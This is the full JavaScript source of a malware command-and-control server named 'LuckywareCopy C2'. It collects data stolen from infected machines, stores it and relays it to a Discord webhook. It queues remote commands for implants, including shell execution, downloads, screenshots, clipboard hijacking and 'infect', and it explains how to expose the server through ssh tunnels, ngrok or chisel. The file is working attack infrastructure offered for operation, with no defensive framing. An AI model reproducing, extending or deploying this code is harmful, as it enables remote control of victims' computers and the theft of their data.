/* LuckywareCopy C2 - no website needed.
 * Run: node src/c2.js --port 8080 [--webhook https://discord.com/api/webhooks/...]
 * Portforward: ssh -R 8080:localhost:8080 user@host  OR  ngrok http 8080  OR  chisel
 * Implant polls GET /tasks?hwid=...  operator adds tasks via CLI or POST /admin/task
 * Exfil lands in ./data/ + relayed to Discord webhook if set.
 */
'use strict';
const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const args = process.argv.slice(2);
function arg(name, def) { const i = args.indexOf(name); return i >= 0 && args[i + 1] ? args[i + 1] : def; }
const PORT = parseInt(arg('--port', process.env.PORT || '8080'), 10);
const WEBHOOK = arg('--webhook', process.env.WEBHOOK || '');
const DATA = path.join(__dirname, '..', 'data');
const TASKS_F = path.join(DATA, 'tasks.json');
const EXFIL_D = path.join(DATA, 'exfil');
fs.mkdirSync(DATA, { recursive: true }); fs.mkdirSync(EXFIL_D, { recursive: true });
if (!fs.existsSync(TASKS_F)) fs.writeFileSync(TASKS_F, JSON.stringify({ tasks: [], clip: {} }));
function loadTasks() { try { return JSON.parse(fs.readFileSync(TASKS_F, 'utf8')); } catch (e) { return { tasks: [], clip: {} }; } }
function saveTasks(j) { fs.writeFileSync(TASKS_F, JSON.stringify(j, null, 2)); }

function relayDiscord(text) {
  if (!WEBHOOK) return;
  try {
    const u = new URL(WEBHOOK);
    const body = JSON.stringify({ content: String(text).slice(0, 1900), username: 'c2' });
    const req = https.request({ hostname: u.hostname, port: 443, path: u.pathname + u.search, method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) } }, () => {});
    req.on('error', () => {}); req.write(body); req.end();
  } catch (e) {}
}
function body(req) { return new Promise(res => { let b = ''; req.on('data', c => { b += c; if (b.length > 5e6) req.destroy(); }); req.on('end', () => { try { res(JSON.parse(b || '{}')); } catch (e) { res({ raw: b }); } }); }); }

const server = http.createServer(async (req, res) => {
  const u = new URL(req.url, 'http://x');
  res.setHeader('Access-Control-Allow-Origin', '*');
  if (req.method === 'GET' && u.pathname === '/tasks') {
    const hwid = u.searchParams.get('hwid') || '';
    const j = loadTasks();
    const mine = j.tasks.filter(t => !t.done && (!t.hwid || t.hwid === 'all' || t.hwid === hwid));
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ tasks: mine.slice(0, 5), clip: j.clip || {}, ts: Date.now() }));
    return;
  }
  if (req.method === 'POST' && u.pathname === '/ack') {
    const b = await body(req);
    const j = loadTasks();
    j.tasks.forEach(t => { if (String(t.id) === String(b.id)) t.done = true; });
    saveTasks(j);
    res.writeHead(200, { 'Content-Type': 'application/json' }); res.end('{"ok":1}');
    return;
  }
  if (req.method === 'POST' && u.pathname === '/exfil') {
    const b = await body(req);
    const f = path.join(EXFIL_D, (b.hwid || 'unknown').replace(/[^a-z0-9]/gi, '') + '-' + (b.kind || 'gen') + '-' + Date.now() + '.json');
    fs.writeFileSync(f, JSON.stringify({ ts: new Date().toISOString(), ip: req.socket.remoteAddress, ...b }).slice(0, 2e6));
    relayDiscord('[' + (b.kind || 'exfil') + '][' + (b.hwid || '?').slice(0, 8) + '] ' + String(b.text || '').slice(0, 1500));
    console.log('[exfil]', b.hwid, b.kind, String(b.text || '').slice(0, 200));
    res.writeHead(200, { 'Content-Type': 'application/json' }); res.end('{"ok":1}');
    return;
  }
  if (req.method === 'POST' && u.pathname === '/admin/task') {
    const b = await body(req);
    const j = loadTasks();
    const id = 't' + crypto.randomBytes(4).toString('hex');
    j.tasks.push({ id, hwid: b.hwid || 'all', type: b.type || 'exc', arg: b.arg || '', ts: Date.now(), done: false });
    saveTasks(j);
    res.writeHead(200, { 'Content-Type': 'application/json' }); res.end(JSON.stringify({ ok: 1, id }));
    console.log('[task queued]', id, b.type, (b.arg || '').slice(0, 120));
    return;
  }
  if (req.method === 'POST' && u.pathname === '/admin/clip') {
    const b = await body(req);
    const j = loadTasks(); j.clip = Object.assign(j.clip || {}, b.clip || b); saveTasks(j);
    res.writeHead(200, { 'Content-Type': 'application/json' }); res.end('{"ok":1}');
    return;
  }
  if (req.method === 'GET' && (u.pathname === '/' || u.pathname === '/admin')) {
    const j = loadTasks();
    const rows = j.tasks.slice(-30).reverse().map(t => '<li>' + t.id + ' [' + t.hwid + '] ' + t.type + ' ' + String(t.arg).slice(0, 80) + (t.done ? ' DONE' : '') + '</li>').join('');
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end('<h3>LuckywareCopy C2 (no website needed)</h3><form method=POST action=/admin/task><input name=hwid placeholder="hwid or all" value="all"><input name=type placeholder="exc/ps/download/screenshot/clip/infect" value="exc"><input name=arg placeholder="command or url" size=60><button>queue</button></form><ul>' + rows + '</ul><p>curl -X POST localhost:' + PORT + '/admin/task -H "Content-Type: application/json" -d "{\\"hwid\\":\\"all\\",\\"type\\":\\"exc\\",\\"arg\\":\\"whoami\\"}"</p>');
    return;
  }
  // tiny form-encoded fallback for /admin/task via browser form
  if (req.method === 'POST' && u.pathname === '/admin/task' && req.headers['content-type'] && req.headers['content-type'].includes('urlencoded')) {
    res.writeHead(302, { Location: '/admin' }); res.end(); return;
  }
  res.writeHead(404); res.end('no');
});
server.listen(PORT, () => {
  console.log('C2 listening on :' + PORT);
  console.log('Implant C2_URL should be http://<your-public-ip-or-ngrok>:' + PORT);
  console.log('Portforward examples:');
  console.log('  ssh -R 8080:localhost:' + PORT + ' user@your-vps');
  console.log('  ngrok http ' + PORT);
  console.log('  chisel server / chisel client <vps>:8080 R:' + PORT + ':localhost:' + PORT);
  console.log('Queue task: curl -X POST http://localhost:' + PORT + '/admin/task -H "Content-Type: application/json" -d "{\\"hwid\\":\\"all\\",\\"type\\":\\"exc\\",\\"arg\\":\\"whoami\\"}"');
});
